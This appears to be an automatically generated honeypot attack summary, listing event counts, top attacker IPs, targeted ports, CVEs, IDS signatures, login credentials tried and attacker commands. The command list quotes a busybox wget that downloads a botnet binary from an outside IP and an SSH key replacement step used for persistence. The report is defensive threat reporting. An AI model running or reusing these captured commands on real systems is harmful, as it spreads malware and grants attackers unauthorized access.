**Honeypot Attack Summary Report**

*   **Report Generation Time:** 2025-10-03T04:01:35Z
*   **Timeframe:** 2025-10-03T03:20:01Z to 2025-10-03T04:00:01Z
*   **Files:** `agg_log_20251003T0320:01Z.json`, `agg_log_20251003T03:40:01Z.json`, `agg_log_20251003T04:00:01Z.json`

**Executive Summary**

This report summarizes 21,675 events collected from the honeypot network. The most active honeypot was Honeytrap, and the most frequent attacker IP was 45.234.176.18. The most targeted port was TCP/445, a common target for SMB exploits. A significant number of commands were executed, indicating successful logins on some honeypots. Several CVEs were detected, with CVE-2019-11500 and CVE-2021-3449 being the most common.

**Detailed Analysis**

*   **Attacks by Honeypot:**
    *   Honeytrap: 7554
    *   Cowrie: 5122
    *   Suricata: 3034
    *   Ciscoasa: 2443
    *   Sentrypeer: 1401
    *   Dionaea: 1105
    *   Mailoney: 863
    *   Tanner: 39
    *   H0neytr4p: 33
    *   ConPot: 24
    *   Honeyaml: 20
    *   Adbhoney: 11
    *   Dicompot: 10
    *   Redishoneypot: 10
    *   ElasticPot: 5
    *   Wordpot: 1

*   **Top Attacking IPs:**
    *   45.234.176.18: 5808
    *   115.186.149.42: 1601
    *   23.175.48.211: 1103
    *   1.53.37.62: 801
    *   176.65.141.117: 820
    *   92.191.96.115: 266
    *   41.226.27.251: 260
    *   103.103.20.246: 341
    *   196.251.84.181: 355
    *   185.156.73.166: 338
    *   92.63.197.55: 332
    *   92.63.197.59: 304
    *   152.32.218.149: 238
    *   184.152.99.244: 178
    *   122.52.201.146: 166
    *   ... and others

*   **Top Targeted Ports/Protocols:**
    *   TCP/445: 1596
    *   5060: 1401
    *   445: 1029
    *   25: 859
    *   22: 703
    *   TCP/22: 56
    *   80: 46
    *   TCP/80: 38
    *   443: 33
    *   27017: 34
    *   10001: 24
    *   ... and others

*   **Most Common CVEs:**
    *   CVE-2019-11500 CVE-2019-11500
    *   CVE-2021-3449 CVE-2021-3449
    *   CVE-2002-0013 CVE-2002-0012
    *   CVE-2016-5696
    *   CVE-2021-35394 CVE-2021-35394
    *   CVE-2019-16920 CVE-2019-16920
    *   CVE-2024-12856 CVE-2024-12856 CVE-2024-12885
    *   CVE-2014-6271
    *   CVE-2023-47565 CVE-2023-47565
    *   CVE-2023-52163 CVE-2023-52163
    *   CVE-2023-31983 CVE-2023-31983
    *   CVE-2024-10914 CVE-2024-10914
    *   CVE-2009-2765
    *   CVE-2015-2051 CVE-2024-33112 CVE-2022-37056 CVE-2019-10891 CVE-2015-2051
    *   CVE-2024-3721 CVE-2024-3721
    *   CVE-2006-3602 CVE-2006-4458 CVE-2006-4542
    *   CVE-2021-42013 CVE-2021-42013
    *   CVE-2002-0013 CVE-2002-0012 CVE-1999-0517

*   **Commands Attempted by Attackers:**
    *   `cd ~; chattr -ia .ssh; lockr -ia .ssh`
    *   `lockr -ia .ssh`
    *   `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ..."`
    *   `cat /proc/cpuinfo | grep name | wc -l`
    *   `uname -a`
    *   `whoami`
    *   `lscpu | grep Model`
    *   `rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; ...`
    *   `cd /data/local/tmp/; rm *; busybox wget http://94.154.35.154/arm.urbotnetisass; ...`

*   **Signatures Triggered:**
    *   ET EXPLOIT [PTsecurity] DoublePulsar Backdoor installation communication
    *   ET DROP Dshield Block Listed Source group 1
    *   ET SCAN NMAP -sS window 1024
    *   ET SCAN MS Terminal Server Traffic on Non-standard Port
    *   ET HUNTING RDP Authentication Bypass Attempt
    *   ET INFO Reserved Internal IP Traffic
    *   ET SCAN Potential SSH Scan

*   **Users / Login Attempts:**
    *   345gs5662d34/345gs5662d34
    *   root/3245gs5662d34
    *   foundry/foundry
    *   test/zhbjETuyMffoL8F
    *   superadmin/admin123
    *   root/LeitboGi0ro
    *   root/nPSpP4PBW0

*   **Files Uploaded/Downloaded:**
    *   `?format=json`
    *   `arm.urbotnetisass`
    *   `rondo.dgx.sh||busybox`
    *   `apply.cgi`
    *   `catgirls;`

*   **HTTP User-Agents:** (None Recorded)
*   **SSH Clients and Servers:** (None Recorded)
*   **Top Attacker AS Organizations:** (None Recorded)

**Key Observations and Anomalies**

*   The high number of Honeytrap events from a single IP (45.234.176.18) suggests a targeted scan or attack.
*   The commands executed on Cowrie honeypots indicate that attackers are attempting to secure their access by modifying `.ssh` directories and authorized keys.
*   The DoublePulsar backdoor signature was triggered a large number of times, indicating attempts to exploit the SMB vulnerability (likely related to MS17-010).
*   Attackers are using `wget` and `curl` to download and execute malicious scripts, as seen in the Adbhoney logs.

This concludes the Honeypot Attack Summary Report.
